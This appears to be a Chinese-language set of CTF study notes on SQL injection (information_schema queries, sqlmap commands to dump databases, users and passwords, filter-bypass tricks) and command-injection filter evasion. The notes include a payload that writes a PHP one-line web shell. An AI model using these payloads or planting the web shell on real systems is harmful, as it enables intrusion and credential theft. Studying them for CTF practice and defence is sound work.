### 编码

------

```
1:0x9字符是 水平定位符
2:0xa字符是 换行符
3:0xb字符是 垂直定位符
4:0xc字符是 换页键
5:0xd字符是 归位符
6:0x20字符是 控制设备4(空格)
7:0x2b字符是 +
```







### **SQL注入**

------

column_name : 列的名称

Information_schema.columns : 表示所有的列的信息

Information_schema : 表示所有信息，包括库、表、列

Information_schema.tables : 表示所有的表的信息

table_schema : 数据库的名称

table_name : 表的名称



关于注释：GET（`--+`），POST（`#`）

@@basedir  得到mysql路径







### sqlmap基础命令

------

查询sqlmap是否存在注入命令 sqlmap.py -u url/?id=1 

查询当前用户下的所有数据库 sqlmap.py -u url/?id=1 --dbs 

获取数据库的表名 sqlmap.py -u url/?id=1 -D (数据库名) --tables 

获取表中的字段名 sqlmap.py -u url/?id=1 -D (数据库名) -T (输入需要查询的表名) --columns 

获取字段的内容 sqlmap.py -u url/?id=1 -D (数据库名) -T (输入需要查询的表名) -C (表内的字段名) --dump 

查询数据库的所有用户 sqlmap.py -u url/?id=1 --users 

查询数据库的所有密码 sqlmap.py -u url/?id=1 --passwords 

查询数据库名称 sqlmap.py -u url/?id=1 --current-db



—cookie  –level 2

—ua lever 3

sqlmap可以在请求中伪HTTP的Referer头，当--level参数大于等于3时，会尝试进行refer注入

–referer  level 5

有的时候扫不出注入点，也是需要提升 level 等级



脚本名： space2comment.py  作用：用注释/**/替换空格字符' '

绕过空格过滤的方法   /**/、()、%0a







### MySQL 删除表

------

delete，drop，truncate 都有删除表的作用，区别在于：

-  1、delete 和 truncate 仅仅删除表数据，drop 连表数据和表结构一起删除，打个比方，delete 是单杀，truncate 是团灭，drop 是把电脑摔了。
-  2、delete 是 DML 语句，操作完以后如果没有不想提交事务还可以回滚，truncate 和 drop 是 DDL 语句，操作完马上生效，不能回滚，打个比方，delete 是发微信说分手，后悔还可以撤回，truncate 和 drop 是直接扇耳光说滚，不能反悔。
-  3、执行的速度上，**drop>truncate>delete**，打个比方，drop 是神舟火箭，truncate 是和谐号动车，delete 是自行车。







### **RCE**

------

> 过滤 cat

**方法一**当cat被过滤后,可以使用一下命令进行读取文件的内容
(1)more:一页一页的显示的显示档案内容
(2)less:与more类似,但是比more更好的是,他可以[pg dn][pg up]翻页
(3)head:查看头几行
(4)tac:从最后一行开始显示,可以看出tac是cat的反向显示
(5)tail:查看尾几行
(6)nl:显示的时候,顺便输出行号
(7)od:以二进制的方式读取档案内容
(8)vi:一种编辑器，这个也可以查看
(9)vim:一种编辑器,这个也可以查看
(10)sort:可以查看
(11)uniq:可以查看



**方法二**
一句话木马
构造payload如下：

CTFHub  RCE –（命令注入，过滤cat）：  `127.0.0.1&echo "<?php @eval(\$_POST['a']);?>" >>shell.php`



**方法三**
反斜杠 ： 例如 ca\t fl\ag.php
连接符： 例如 ca’‘t fla‘’g.txt



> 过滤空格，其实就`;`就行呀

**当空格被过滤后,可以使用一下命令进行读取文件的内容**
`<` `<>` ` >`重定向符
`%09`(需要php环境)(tab)
`%20`(space)
`${IFS}`
`$IFS$9`
{cat,flag.php} //用逗号实现了空格功能
`%20`

PS：为什么我只有`<`可以